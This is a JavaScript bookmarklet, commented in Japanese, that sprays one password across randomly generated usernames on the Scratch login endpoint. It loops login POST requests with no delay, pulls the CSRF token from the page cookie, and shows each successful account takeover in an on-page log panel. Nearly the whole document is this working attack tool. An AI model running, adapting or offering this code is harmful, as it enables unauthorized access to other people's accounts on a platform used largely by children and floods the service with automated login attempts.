javascript:(function(){
try{
  const used = new Set();

  function g(n){
    var m = document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));
    return m ? decodeURIComponent(m[1]) : null;
  }

  function r(l, opts, must){
    let c = "";
    if(opts.includeLetters) c += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if(opts.includeSymbols) c += "_-";
    if(opts.includeNumbers)  c += "0123456789";
    if(!c) throw new Error("文字種が選択されていません");

    let s = must || "";
    while(s.length < l) s += c.charAt(Math.floor(Math.random()*c.length));
    s = s.split("").sort(() => Math.random() - 0.5).join("");

    if(used.has(s)) return null;
    used.add(s);
    return s;
  }

  async function login(u, p){
    try{
      const res = await fetch("https://scratch.mit.edu/accounts/login/", {
        method: "POST",
        credentials: "include",
        headers: {
          "x-csrftoken": g("scratchcsrftoken") || "a",
          "x-requested-with": "XMLHttpRequest",
          "content-type": "application/json",
          "accept": "application/json"
        },
        body: JSON.stringify({
          username: u,
          password: p,
          useMessages: true
        })
      });

      if(res.status === 200){
        log("lime", "成功: " + u);
        return true;
      }
      return false;
    }catch(e){
      return false;
    }
  }

  function log(color, msg){
    let d = document.getElementById("loginLogDiv");
    if(!d){
      d = document.createElement("div");
      d.id = "loginLogDiv";
      Object.assign(d.style, {
        position: "fixed",
        top: "10px",
        right: "10px",
        width: "300px",
        maxHeight: "70vh",
        overflowY: "auto",
        background: "rgba(0,0,0,0.85)",
        color: "white",
        border: "1px solid #444",
        zIndex: 999999,
        fontSize: "14px",
        padding: "10px",
        fontFamily: "Consolas, monospace",
        borderRadius: "4px"
      });

      let btn = document.createElement("button");
      btn.textContent = "STOP";
      btn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#c00; color:white; border:none; border-radius:4px; cursor:pointer;";
      btn.onclick = () => {
        clearInterval(window.loginTimer);
        log("orange", "停止しました");
      };
      d.appendChild(btn);

      document.body.appendChild(d);
    }

    let line = document.createElement("div");
    line.style.color = color;
    line.textContent = msg;
    d.appendChild(line);
    d.scrollTop = d.scrollHeight;
  }

  (async function(){
    const len = parseInt(prompt("生成する文字数","3"), 10);
    if(!len || isNaN(len)) return;

    let must = prompt("必ず含める文字（なしなら空欄やNO）","");
    if(must === "NO" || must === "no") must = "";

    const includeLetters  = prompt("英字を含める？ (1=はい)", "1") === "1";
    const includeSymbols  = prompt("_-を含める？ (1=はい)", "1") === "1";
    const includeNumbers  = prompt("数字を含める？ (1=はい)", "1") === "1";

    const pass = prompt("試すパスワードを入力");
    if(!pass) return;

    const opts = { includeLetters, includeSymbols, includeNumbers };

    log("white", "開始しました");

    window.loginTimer = setInterval(async () => {
      let user;
      do {
        user = r(len, opts, must);
      } while(!user);  // 重複したら即再生成

      await login(user, pass);
      // 成功以外は何も表示しない
    }, 0);

  })();
}catch(e){
  alert("エラー: " + e.message);
}})();
